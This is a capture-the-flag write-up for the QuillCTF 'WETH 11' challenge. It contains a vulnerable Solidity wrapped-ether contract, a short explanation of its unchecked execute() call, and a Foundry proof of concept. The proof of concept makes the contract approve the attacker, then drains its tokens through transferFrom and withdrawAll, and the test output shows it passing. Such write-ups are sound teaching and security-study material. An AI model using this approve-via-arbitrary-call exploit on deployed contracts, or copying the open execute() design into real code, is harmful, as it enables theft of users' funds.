# QuillCTF : WETH 11

## Objective of CTF

We have fixed WETH10 and now have introduced its new version WETH11.
But along the way, bob made a mistake and transferred its tokens to the wrong address.
Can you help bob recover his 10 ether?

### Contract code
```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Angel Di Maria Wrapped Ether
contract WETH11 is ERC20("Angel Di Maria Wrapped Ether", "WETH11"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        _burn(msg.sender, wad);
        Address.sendValue(payable(msg.sender), wad);
       
    }

    function withdrawAll() external nonReentrant {
        uint256 balance = balanceOf(msg.sender);
        _burnAll();
        Address.sendValue(payable(msg.sender), balance);
        
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```

### Foundry setup
```solidity
// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../src/WETH11.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}
```

This challenge has fixed the bug on `withdrawAll()`, by burning all token first before sending ether back

However the bug on `execute()` has not been fixed, which allow us to make transaction on behalf of the WETH11 contract, such as approving ourselves to transfer the contract's token away

On the foundry setup, after bob has deposited 10 ether, he transfered all of his token to the WETH11 contract, so WETH11 contract owns 10 ether of WETH11 token

We can use `execute()` to approve ourselves to transfer all the token away, then just use `transferFrom()` to transfer the token from WETH11 to us, then just withdraw all of them to get ether

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/interfaces/IERC20.sol";

import "../src/WETH11.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;
    
    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!
        weth.execute(address(weth), 0, abi.encodeWithSelector(ERC20.approve.selector, address(bob), type(uint256).max));
        weth.transferFrom(address(weth), address(bob), weth.balanceOf(address(weth)));
        weth.withdrawAll();

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}
```

### Foundry test output

```
# forge test --match-path test/WETH11.t.sol 
[⠰] Compiling...
No files changed, compilation skipped

Running 1 test for test/WETH11.t.sol:Weth11Test
[PASS] testHack() (gas: 92788)
Test result: ok. 1 passed; 0 failed; finished in 983.04µs
```